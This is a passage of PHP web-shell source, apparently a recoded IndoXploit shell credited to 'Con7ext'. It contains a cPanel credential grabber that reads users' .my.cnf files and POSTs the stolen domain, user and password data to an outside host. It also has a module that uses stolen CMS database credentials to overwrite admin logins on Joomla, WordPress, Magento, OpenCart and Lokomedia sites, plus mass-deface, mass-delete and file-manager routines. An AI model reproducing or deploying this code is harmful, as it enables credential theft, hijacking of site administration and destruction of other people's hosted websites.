echo "<table align=center><tr><th valign=top  class=style2> COUNT </th><th valign=top > DOMAIN </th><th valign=top class=style2 > USER </th><th valign=top class=style2 > Password </th><th valign=top class=style2 > .my.cnf </th></tr>";
$count=1;
$dc = 0;
$list = scandir("/var/named");
foreach($list as $domain){
if(strpos($domain,".db")){
$domain = str_replace('.db','',$domain);
$owner = posix_getpwuid(fileowner("/etc/valiases/".$domain));
$dirz = '/home/'.$owner['name'].'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$owner['name'].'.txt');
$p=file_get_contents(''.$path.'/'.$owner['name'].'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top style=border :2px solid white; width: 139px class=style2>".$count++."</td><td valign=top style= width: 139px; border :2px solid white  class=style2 ><a href=http://".$domain.":2082 target=_blank>".$domain."</a></td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$owner['name']."</td><td valign=top style= width: 139px; border: 2px solid white  class=style2 >".$password."</td><td valign=top style=border :2px solid white style=width: 139px><a href=".$owner['name'].".txt target=_blank>Click Here</a></td></tr>";
$dc++;
$success3="http://".$domain."|".$owner['name']."|".$password."\n";
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,"http://ww3s.ws/ok.php");
curl_setopt($ch,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:18.0) Gecko/20100101 Firefox/18.0');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS,"result=".base64_encode($success3));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
curl_setopt($ch, CURLOPT_HEADER, 1);
$buffer = curl_exec($ch);
}
}
}
echo '</table>';
$total = $dc;
 
echo '</center>';
}else{
$d0mains = @file('/etc/named.conf');
    if($d0mains) {
echo "<table align=center><tr><th> COUNT </th><th> DOMAIN </th><th> USER </th><th> Password </th><th> .my.cnf </th></tr>";
$count=1;
$dc = 0;
$mck = array();
foreach($d0mains as $d0main){
    if(@eregi('zone',$d0main)){
        preg_match_all('#zone "(.*)"#',$d0main,$domain);
        flush();
        if(strlen(trim($domain[1][0])) >2){
            $mck[] = $domain[1][0];
        }
    }
}
$mck = array_unique($mck);
$usr = array();
$dmn = array();
foreach($mck as $o) {
    $infos = @posix_getpwuid(fileowner("/etc/valiases/".$o));
    $usr[] = $infos['name'];
    $dmn[] = $o;
}
array_multisort($usr,$dmn);
$dt = file('/etc/passwd');
$passwd = array();
foreach($dt as $d) {
    $r = explode(':',$d);
    if(strpos($r[5],'home')) {
        $passwd[$r[0]] = $r[5];
    }
}
$l=0;
$j=1;
foreach($usr as $r) {
$dirz = '/home/'.$r.'/.my.cnf';
$path = getcwd();
if (is_readable($dirz)) {
copy($dirz, ''.$path.'/'.$r.'.txt');
$p=file_get_contents(''.$path.'/'.$r.'.txt');
$password=entre2v2($p,'password="','"');
echo "<tr><td valign=top class=style2 style=width: 139px>".$count++."</td><td valign=top class=style2 style=width: 139px><a target=_blank href=http://".$dmn[$j-1].'/>'.$dmn[$j-1].' </a></td><td valign=top class=style2 style=width: 139px>'.$r."</td><td valign=top class=style2 style=width: 139px>".$password."</td><td valign=top class=style2 style=width: 139px><a href='".$r.".txt' target='_blank'>Click Here</a></td></tr>";
$dc++;
                flush();
                $l=$l?0:1;
                $j++;
                }
            }
            }
echo '</table>';
$total = $dc;
echo '<br><div class=result valign=top class=style2 style=width: 139px >Total cPanel Found = '.$total.'</h3><br />';
echo '</center>';
}
 
}else{
echo "<div class=result><i><font color=#FF0000>ERROR</font><br><font color=#FF0000>/var/named</font> or <font color=#FF0000>etc/named.conf</font> Not Accessible!</i></div>";
}
}elseif($_GET['mass'] == 'changer') {
if($_POST['sikat']) {
      echo "<center><h1>Config Reset Password</h1>
    <form method='post'>
    Link Config: <br>
    <textarea name='link' style='width: 450px; height:250px;'>";
    GrabUrl($_POST['linkconfig'],'txt'); 
    echo"</textarea><br>
        User Baru : <input type='text' name='newuser' placeholder='con7ext'> <br><br>
        Password Baru : <input type='text' name='newpasswd' placeholder='con7ext'><br><br>
    <input type='submit' style='width: 450px;' name='masschanger' value='Hajar!!'>
    </form></center>";
  }else {
    echo '<center>
    <h1>Config Reset Password</h1>
    <form method="post">
    </select><br>
    Link Config :<br>
    <input type="text" name="linkconfig" height="10" style="width: 450px;" placeholder="http://jembod.com/brudul_symconf/"><br>
    <input type="submit" style="width: 450px;" name="sikat" value="Change User!!">
    </form></center>';
  }
  if($_POST['masschanger']) {
    $user = $_POST['newuser'];
    $pass = $_POST['newpasswd'];
    $passx = md5($pass);
    $link = explode("\r\n", $_POST['link']);
    foreach($link as $file_conf) {
      $config = file_get_contents($file_conf);
      if(preg_match("/JConfig|joomla/",$config)) {
        $dbhost = ambilkata($config,"host = '","'");
        $dbuser = ambilkata($config,"user = '","'");
        $dbpass = ambilkata($config,"password = '","'");
        $dbname = ambilkata($config,"db = '","'");
        $dbprefix = ambilkata($config,"dbprefix = '","'");
        $prefix = $dbprefix."users";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
        $result = mysql_fetch_array($q);
        $id = $result['id'];
        $site = ambilkata($config,"sitename = '","'");
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE id='$id'");
        echo "CMS: Joomla<br>";
        if($site == '') {
          echo "Sitename => <font color=red>Error Cok</font><br>";
        } else {
          echo "Sitename => $site<br>";
        }
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/WordPress/",$config)) {
        $dbhost = ambilkata($config,"DB_HOST', '","'");
        $dbuser = ambilkata($config,"DB_USER', '","'");
        $dbpass = ambilkata($config,"DB_PASSWORD', '","'");
        $dbname = ambilkata($config,"DB_NAME', '","'");
        $dbprefix = ambilkata($config,"table_prefix  = '","'");
        $prefix = $dbprefix."users";
        $option = $dbprefix."options";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[ID];
        $q2 = mysql_query("SELECT * FROM $option ORDER BY option_id ASC");
        $result2 = mysql_fetch_array($q2);
        $target = $result2[option_value];
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target/wp-login.php' target='_blank'><u>$target/wp-login.php</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET user_login='$user',user_pass='$passx' WHERE id='$id'");
        echo "CMS: Wordpress<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/Magento|Mage_Core/",$config)) {
        $dbhost = ambilkata($config,"<host><![CDATA[","]]></host>");
        $dbuser = ambilkata($config,"<username><![CDATA[","]]></username>");
        $dbpass = ambilkata($config,"<password><![CDATA[","]]></password>");
        $dbname = ambilkata($config,"<dbname><![CDATA[","]]></dbname>");
        $dbprefix = ambilkata($config,"<table_prefix><![CDATA[","]]></table_prefix>");
        $prefix = $dbprefix."admin_user";
        $option = $dbprefix."core_config_data";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[user_id];
        $q2 = mysql_query("SELECT * FROM $option WHERE path='web/secure/base_url'");
        $result2 = mysql_fetch_array($q2);
        $target = $result2[value];
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target/admin/' target='_blank'><u>$target/admin/</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
        echo "CMS: Magento<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/HTTP_SERVER|HTTP_CATALOG|DIR_CONFIG|DIR_SYSTEM/",$config)) {
        $dbhost = ambilkata($config,"'DB_HOSTNAME', '","'");
        $dbuser = ambilkata($config,"'DB_USERNAME', '","'");
        $dbpass = ambilkata($config,"'DB_PASSWORD', '","'");
        $dbname = ambilkata($config,"'DB_DATABASE', '","'");
        $dbprefix = ambilkata($config,"'DB_PREFIX', '","'");
        $prefix = $dbprefix."user";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $prefix ORDER BY user_id ASC");
        $result = mysql_fetch_array($q);
        $id = $result[user_id];
        $target = ambilkata($config,"HTTP_SERVER', '","'");
        if($target == '') {
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
        } else {
          $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a><br>";
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE user_id='$id'");
        echo "CMS: OpenCart<br>";
        echo $url_target;
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      } elseif(preg_match("/panggil fungsi validasi xss dan injection/",$config)) {
        $dbhost = ambilkata($config,'server = "','"');
        $dbuser = ambilkata($config,'username = "','"');
        $dbpass = ambilkata($config,'password = "','"');
        $dbname = ambilkata($config,'database = "','"');
        $prefix = "users";
        $option = "identitas";
        $conn = mysql_connect($dbhost,$dbuser,$dbpass);
        $db = mysql_select_db($dbname);
        $q = mysql_query("SELECT * FROM $option ORDER BY id_identitas ASC");
        $result = mysql_fetch_array($q);
        $target = $result[alamat_website];
        if($target == '') {
          $target2 = $result[url];
          $url_target = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          if($target2 == '') {
            $url_target2 = "Login => <font color=red>error, gabisa ambil nama domain nyaa</font><br>";
          } else {
            $cek_login3 = file_get_contents("$target2/adminweb/");
            $cek_login4 = file_get_contents("$target2/lokomedia/adminweb/");
            if(preg_match("/CMS Lokomedia|Administrator/", $cek_login3)) {
              $url_target2 = "Login => <a href='$target2/adminweb' target='_blank'><u>$target2/adminweb</u></a><br>";
            } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login4)) {
              $url_target2 = "Login => <a href='$target2/lokomedia/adminweb' target='_blank'><u>$target2/lokomedia/adminweb</u></a><br>";
            } else {
              $url_target2 = "Login => <a href='$target2' target='_blank'><u>$target2</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
            }
          }
        } else {
          $cek_login = file_get_contents("$target/adminweb/");
          $cek_login2 = file_get_contents("$target/lokomedia/adminweb/");
          if(preg_match("/CMS Lokomedia|Administrator/", $cek_login)) {
            $url_target = "Login => <a href='$target/adminweb' target='_blank'><u>$target/adminweb</u></a><br>";
          } elseif(preg_match("/CMS Lokomedia|Lokomedia/", $cek_login2)) {
            $url_target = "Login => <a href='$target/lokomedia/adminweb' target='_blank'><u>$target/lokomedia/adminweb</u></a><br>";
          } else {
            $url_target = "Login => <a href='$target' target='_blank'><u>$target</u></a> [ <font color=red>gatau admin login nya dimana :p</font> ]<br>";
          }
        }
        $update = mysql_query("UPDATE $prefix SET username='$user',password='$passx' WHERE level='admin'");
        echo "CMS: Lokomedia<br>";
        if(preg_match('/error, gabisa ambil nama domain nya/', $url_target)) {
          echo $url_target2;
        } else {
          echo $url_target;
        }
        if(!$update OR !$conn OR !$db) {
          echo "[-] <font color=red>".mysql_error()."</font><br><br>";
        } else {
          echo "[+] username: <font color=lime>$user</font><br>";
          echo "[+] password: <font color=lime>$pass</font><br><br>";
        }
        mysql_close($conn);
      }
    }
  }     
} elseif($_GET['act'] == 'newfolder') {
	if($_POST['new_save_folder']) {
		$new_folder = $dir.'/'.htmlspecialchars($_POST['newfolder']);
		if(!mkdir($new_folder)) {
			$act = "<font color=red>permission denied</font>";
		} else {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		}
	}
	echo $act;
	echo "<form method='post'>
	Folder Name: <input type='text' name='newfolder' style='width: 450px;' height='10'>
	<input type='submit' name='new_save_folder' value='Submit'>
	</form>";
} elseif($_GET['act'] == 'rename_dir') {
	if($_POST['dir_rename']) {
		$dir_rename = rename($dir, "".dirname($dir)."/".htmlspecialchars($_POST['fol_rename'])."");
		if($dir_rename) {
			$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "<form method='post'>
	<input type='text' value='".basename($dir)."' name='fol_rename' style='width: 450px;' height='10'>
	<input type='submit' name='dir_rename' value='rename'>
	</form>";
} elseif($_GET['act'] == 'delete_dir') {
	$delete_dir = rmdir($dir);
	if($delete_dir) {
		$act = "<script>window.location='?dir=".dirname($dir)."';</script>";
	} else {
		$act = "<font color=red>could not remove ".basename($dir)."</font>";
	}
	echo $act;
} elseif($_GET['act'] == 'view') {
	echo "Filename: <font color=white>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'><b>view</b></a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<textarea readonly>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea>";
} elseif($_GET['act'] == 'edit') {
	if($_POST['save']) {
		$save = file_put_contents($_GET['file'], $_POST['src']);
		if($save) {
			$act = "<font color=white>Saved!</font>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=white>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'><b>edit</b></a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'>rename</a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<textarea name='src'>".htmlspecialchars(@file_get_contents($_GET['file']))."</textarea><br>
	<input type='submit' value='Save' name='save' style='width: 500px;'>
	</form>";
} elseif($_GET['act'] == 'rename') {
	if($_POST['do_rename']) {
		$rename = rename($_GET['file'], "$dir/".htmlspecialchars($_POST['rename'])."");
		if($rename) {
			$act = "<script>window.location='?dir=".$dir."';</script>";
		} else {
			$act = "<font color=red>permission denied</font>";
		}
	echo "".$act."<br>";
	}
	echo "Filename: <font color=white>".basename($_GET['file'])."</font> [ <a href='?act=view&dir=$dir&file=".$_GET['file']."'>view</a> ] [ <a href='?act=edit&dir=$dir&file=".$_GET['file']."'>edit</a> ] [ <a href='?act=rename&dir=$dir&file=".$_GET['file']."'><b>rename</b></a> ] [ <a href='?act=download&dir=$dir&file=".$_GET['file']."'>download</a> ] [ <a href='?act=delete&dir=$dir&file=".$_GET['file']."'>delete</a> ]<br>";
	echo "<form method='post'>
	<input type='text' value='".basename($_GET['file'])."' name='rename' style='width: 450px;' height='10'>
	<input type='submit' name='do_rename' value='rename'>
	</form>";
} elseif($_GET['jancok'] == 'mass') {
	echo "<center><form action=\"\" method=\"post\">\n";
	$dirr=$_POST['d_dir'];
	$index = $_POST["script"];
	$index = str_replace('"',"'",$index);
	$index = stripslashes($index);
	function edit_file($file,$index){
		if (is_writable($file)) {
		clear_fill($file,$index);
		echo "<Span style='color:green;'><strong> [+] Nyabun 100% Successfull </strong></span><br></center>";
		} 
		else {
			echo "<Span style='color:red;'><strong> [-] Ternyata Tidak Boleh Menyabun Disini :( </strong></span><br></center>";
			}
			}
	function hapus_massal($dir,$namafile) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					if(file_exists("$dir/$namafile")) {
						unlink("$dir/$namafile");
					}
				} elseif($dirb === '..') {
					if(file_exists("".dirname($dir)."/$namafile")) {
						unlink("".dirname($dir)."/$namafile");
					}
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							if(file_exists($lokasi)) {
								echo "[<font color=lime>DELETED</font>] $lokasi<br>";
								unlink($lokasi);
								$idx = hapus_massal($dirc,$namafile);
							}
						}
					}
				}
			}
		}
	}
	function clear_fill($file,$index){
		if(file_exists($file)){
			$handle = fopen($file,'w');
			fwrite($handle,'');
			fwrite($handle,$index);
			fclose($handle);  } }

	function gass(){
		global $dirr , $index ;
		chdir($dirr);
		$me = str_replace(dirname(__FILE__).'/','',__FILE__);
		$files = scandir($dirr) ;
		$notallow = array(".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","..",".");
		sort($files);
		$n = 0 ;
		foreach ($files as $file){
			if ( $file != $me && is_dir($file) != 1 && !in_array($file, $notallow) ) {
				echo "<center><Span style='color: #8A8A8A;'><strong>$dirr/</span>$file</strong> ====> ";
				edit_file($file,$index);
				flush();
				$n = $n +1 ;
				} 
				}
				echo "<br>";
				echo "<center><br><h3>$n Kali Anda Telah Ngecrot  Disini </h3></center><br>";
					}
	function ListFiles($dirrall) {

    if($dh = opendir($dirrall)) {

       $files = Array();
       $inner_files = Array();
       $me = str_replace(dirname(__FILE__).'/','',__FILE__);
       $notallow = array($me,".htaccess","error_log","_vti_inf.html","_private","_vti_bin","_vti_cnf","_vti_log","_vti_pvt","_vti_txt","cgi-bin",".contactemail",".cpanel",".fantasticodata",".htpasswds",".lastlogin","access-logs","cpbackup-exclude-used-by-backup.conf",".cgi_auth",".disk_usage",".statspwd","Thumbs.db");
        while($file = readdir($dh)) {
            if($file != "." && $file != ".." && $file[0] != '.' && !in_array($file, $notallow) ) {
                if(is_dir($dirrall . "/" . $file)) {
                    $inner_files = ListFiles($dirrall . "/" . $file);
                    if(is_array($inner_files)) $files = array_merge($files, $inner_files);
                } else {
                    array_push($files, $dirrall . "/" . $file);
                }
            }
			}

			closedir($dh);
			return $files;
		}
	}
	function gass_all(){
		global $index ;
		$dirrall=$_POST['d_dir'];
		foreach (ListFiles($dirrall) as $key=>$file){
			$file = str_replace('//',"/",$file);
			echo "<center><strong>$file</strong> ===>";
			edit_file($file,$index);
			flush();
		}
		$key = $key+1;
	echo "<center><br><h3>$key Kali Anda Telah Ngecrot  Disini  </h3></center><br>"; }
	function sabun_massal($dir,$namafile,$isi_script) {
		if(is_writable($dir)) {
			$dira = scandir($dir);
			foreach($dira as $dirb) {
				$dirc = "$dir/$dirb";
				$lokasi = $dirc.'/'.$namafile;
				if($dirb === '.') {
					file_put_contents($lokasi, $isi_script);
				} elseif($dirb === '..') {
					file_put_contents($lokasi, $isi_script);
				} else {
					if(is_dir($dirc)) {
						if(is_writable($dirc)) {
							echo "[<font color=lime>DONE</font>] $lokasi<br>";
							file_put_contents($lokasi, $isi_script);
							$idx = sabun_massal($dirc,$namafile,$isi_script);
						}
					}
				}
			}
		}
	}
	if($_POST['mass'] == 'onedir') {
		echo "<br> Versi Text Area<br><textarea style='background:black;outline:none;color:red;' name='index' rows='10' cols='67'>\n";
		$ini="http://";
		$mainpath=$_POST[d_dir];
		$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){
		$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){
			echo"$ini$row/$file\n";
			}
		}
		echo "</textarea><br><br><br><b>Versi Text</b><br><br><br>\n";
		$mainpath=$_POST[d_dir];$file=$_POST[d_file];
		$dir=opendir("$mainpath");
		$code=base64_encode($_POST[script]);
		$indx=base64_decode($code);
		while($row=readdir($dir)){$start=@fopen("$row/$file","w+");
		$finish=@fwrite($start,$indx);
		if ($finish){echo '<a href="http://' . $row . '/' . $file . '" target="_blank">http://' . $row . '/' . $file . '</a><br>'; }
		}

	}
	elseif($_POST['mass'] == 'sabunkabeh') { gass(); }
	elseif($_POST['mass'] == 'hapusmassal') { hapus_massal($_POST['d_dir'], $_POST['d_file']); }
	elseif($_POST['mass'] == 'sabunmematikan') { gass_all(); }
	elseif($_POST['mass'] == 'massdeface') {
		echo "<div style='margin: 5px auto; padding: 5px'>";
		sabun_massal($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
		echo "</div>";	}
	else {
		echo "
		<center><font style='text-decoration: underline;'>
		Select Type:<br>
		</font>
		<select class=\"select\" name=\"mass\"  style=\"width: 450px;\" height=\"10\">
		<option value=\"onedir\">Mass Deface 1 Dir</option>
		<option value=\"massdeface\">Mass Deface ALL Dir</option>
		<option value=\"sabunkabeh\">Sabun Massal Di Tempat</option>
		<option value=\"sabunmematikan\">Sabun Massal Bunuh Diri</option>
		<option value=\"hapusmassal\">Mass Delete Files</option></center></select><br>
		<font style='text-decoration: underline;'>Folder:</font><br>
		<input type='text' name='d_dir' value='$dir' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Filename:</font><br>
		<input type='text' name='d_file' value='ngeue.php' style='width: 450px;' height='10'><br>
		<font style='text-decoration: underline;'>Index File:</font><br>
		<textarea name='script' style='width: 450px; height: 200px;'>Hacked By Rinto AR</textarea><br>
		<input type='submit' name='start' value='Mass Deface' style='width: 450px;'>
		</form></center>";
		}
} elseif($_GET['act'] == 'delete') {
	$delete = unlink($_GET['file']);
	if($delete) {
		$act = "<script>window.location='?dir=".$dir."';</script>";
	} else {
		$act = "<font color=red>permission denied</font>";
	}
	echo $act;
} else {
	if(is_dir($dir) === true) {
		if(!is_readable($dir)) {
			echo "<font color=red>can't open directory. ( not readable )</font>";
		} else {
			echo '<table width="100%" class="table_home" border="0" cellpadding="3" cellspacing="1" align="center">
			<tr>
			<th class="th_home"><center>Name</center></th>
			<th class="th_home"><center>Type</center></th>
			<th class="th_home"><center>Size</center></th>
			<th class="th_home"><center>Last Modified</center></th>
			<th class="th_home"><center>Owner/Group</center></th>
			<th class="th_home"><center>Permission</center></th>
			<th class="th_home"><center>Action</center></th>
			</tr>';
			$scandir = scandir($dir);
			foreach($scandir as $dirx) {
				$dtype = filetype("$dir/$dirx");
				$dtime = date("F d Y g:i:s", filemtime("$dir/$dirx"));
				if(function_exists('posix_getpwuid')) {
					$downer = @posix_getpwuid(fileowner("$dir/$dirx"));
					$downer = $downer['name'];
				} else {
					//$downer = $uid;
					$downer = fileowner("$dir/$dirx");
				}
				if(function_exists('posix_getgrgid')) {
					$dgrp = @posix_getgrgid(filegroup("$dir/$dirx"));
					$dgrp = $dgrp['name'];
				} else {
					$dgrp = filegroup("$dir/$dirx");
				}
 				if(!is_dir("$dir/$dirx")) continue;
 				if($dirx === '..') {
 					$href = "<a href='?dir=".dirname($dir)."'>$dirx</a>";
 				} elseif($dirx === '.') {
 					$href = "<a href='?dir=$dir'>$dirx</a>";
 				} else {
 					$href = "<a href='?dir=$dir/$dirx'>$dirx</a>";
 				}
 				if($dirx === '.' || $dirx === '..') {
 					$act_dir = "<a href='?act=newfile&dir=$dir'>newfile</a> | <a href='?act=newfolder&dir=$dir'>newfolder</a>";
 					} else {
 					$act_dir = "<a href='?act=rename_dir&dir=$dir/$dirx'>rename</a> | <a href='?act=delete_dir&dir=$dir/$dirx'>delete</a>";
 				}
 				echo "<tr>";
 				echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAQAAAC1+jfqAAAAAXNSR0IArs4c6QAAAAJiS0dEAP+Hj8y/AAAACXBIWXMAAAsTAAALEwEAmpwYAAAA00lEQVQoz6WRvUpDURCEvzmuwR8s8gr2ETvtLSRaKj6ArZU+VVAEwSqvJIhIwiX33nPO2IgayK2cbtmZWT4W/iv9HeacA697NQRY281Fr0du1hJPt90D+xgc6fnwXjC79JWyQdiTfOrf4nk/jZf0cVenIpEQImGjQsVod2cryvH4TEZC30kLjME+KUdRl24ZDQBkryIvtOJggLGri+hbdXgd90e9++hz6rR5jYtzZKsIDzhwFDTQDzZEsTz8CRO5pmVqB240ucRbM7kejTcalBfvn195EV+EajF1hgAAAABJRU5ErkJggg=='>$href</td>";
				echo "<td class='td_home'><center>$dtype</center></td>";
				echo "<td class='td_home'><center>-</center></th></td>";
				echo "<td class='td_home'><center>$dtime</center></td>";
				echo "<td class='td_home'><center>$downer/$dgrp</center></td>";
				echo "<td class='td_home'><center>".w("$dir/$dirx",perms("$dir/$dirx"))."</center></td>";
				echo "<td class='td_home' style='padding-left: 15px;'>$act_dir</td>";
				echo "</tr>";
			}
		}
	} else {
		echo "<font color=red>can't open directory.</font>";
	}
		foreach($scandir as $file) {
			$ftype = filetype("$dir/$file");
			$ftime = date("F d Y g:i:s", filemtime("$dir/$file"));
			$size = filesize("$dir/$file")/1024;
			$size = round($size,3);
			if(function_exists('posix_getpwuid')) {
				$fowner = @posix_getpwuid(fileowner("$dir/$file"));
				$fowner = $fowner['name'];
			} else {
				//$downer = $uid;
				$fowner = fileowner("$dir/$file");
			}
			if(function_exists('posix_getgrgid')) {
				$fgrp = @posix_getgrgid(filegroup("$dir/$file"));
				$fgrp = $fgrp['name'];
			} else {
				$fgrp = filegroup("$dir/$file");
			}
			if($size > 1024) {
				$size = round($size/1024,2). 'MB';
			} else {
				$size = $size. 'KB';
			}
			if(!is_file("$dir/$file")) continue;
			echo "<tr>";
			echo "<td class='td_home'><img src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAAZiS0dEAP8A/wD/oL2nkwAAAAlwSFlzAAALEwAACxMBAJqcGAAAAAd0SU1FB9oJBhcTJv2B2d4AAAJMSURBVDjLbZO9ThxZEIW/qlvdtM38BNgJQmQgJGd+A/MQBLwGjiwH3nwdkSLtO2xERG5LqxXRSIR2YDfD4GkGM0P3rb4b9PAz0l7pSlWlW0fnnLolAIPB4PXh4eFunucAIILwdESeZyAifnp6+u9oNLo3gM3NzTdHR+//zvJMzSyJKKodiIg8AXaxeIz1bDZ7MxqNftgSURDWy7LUnZ0dYmxAFAVElI6AECygIsQQsizLBOABADOjKApqh7u7GoCUWiwYbetoUHrrPcwCqoF2KUeXLzEzBv0+uQmSHMEZ9F6SZcr6i4IsBOa/b7HQMaHtIAwgLdHalDA1ev0eQbSjrErQwJpqF4eAx/hoqD132mMkJri5uSOlFhEhpUQIiojwamODNsljfUWCqpLnOaaCSKJtnaBCsZYjAllmXI4vaeoaVX0cbSdhmUR3zAKvNjY6Vioo0tWzgEonKbW+KkGWt3Unt0CeGfJs9g+UU0rEGHH/Hw/MjH6/T+POdFoRNKChM22xmOPespjPGQ6HpNQ27t6sACDSNanyoljDLEdVaFOLe8ZkUjK5ukq3t79lPC7/ODk5Ga+Y6O5MqymNw3V1y3hyzfX0hqvJLybXFd++f2d3d0dms+qvg4ODz8fHx0/Lsbe3964sS7+4uEjunpqmSe6e3D3N5/N0WZbtly9f09nZ2Z/b29v2fLEevvK9qv7c2toKi8UiiQiqHbm6riW6a13fn+zv73+oqorhcLgKUFXVP+fn52+Lonj8ILJ0P8ZICCF9/PTpClhpBvgPeloL9U55NIAAAAAASUVORK5CYII='><a href='?act=view&dir=$dir&file=$dir/$file'>$file</a></td>";
echo "<td class='td_home'><center>$ftype</center></td>";
			echo "<td class='td_home'><center>$size</center></td>";
			echo "<td class='td_home'><center>$ftime</center></td>";
			echo "<td class='td_home'><center>$fowner/$fgrp</center></td>";
			echo "<td class='td_home'><center>".w("$dir/$file",perms("$dir/$file"))."</center></td>";
			echo "<td class='td_home' style='padding-left: 15px;'><a href='?act=edit&dir=$dir&file=$dir/$file'>edit</a> | <a href='?act=rename&dir=$dir&file=$dir/$file'>rename</a> | <a href='?act=delete&dir=$dir&file=$dir/$file'>delete</a> | <a href='?act=download&dir=$dir&file=$dir/$file'>download</a></td>";
			echo "</tr>";
		}
		echo "</table>";
		if(!is_readable($dir)) {
			//
		} else {
			echo "<br>";
		}
	echo "<center>Copyright &copy; ".date("Y")." - <a href='http://jembudparanoit.blogspot.com' target='_blank'><font color=red>Con7ext </a> | Recoded From IndoXploit Shell</font></a></center>";
	}
?>
</html>
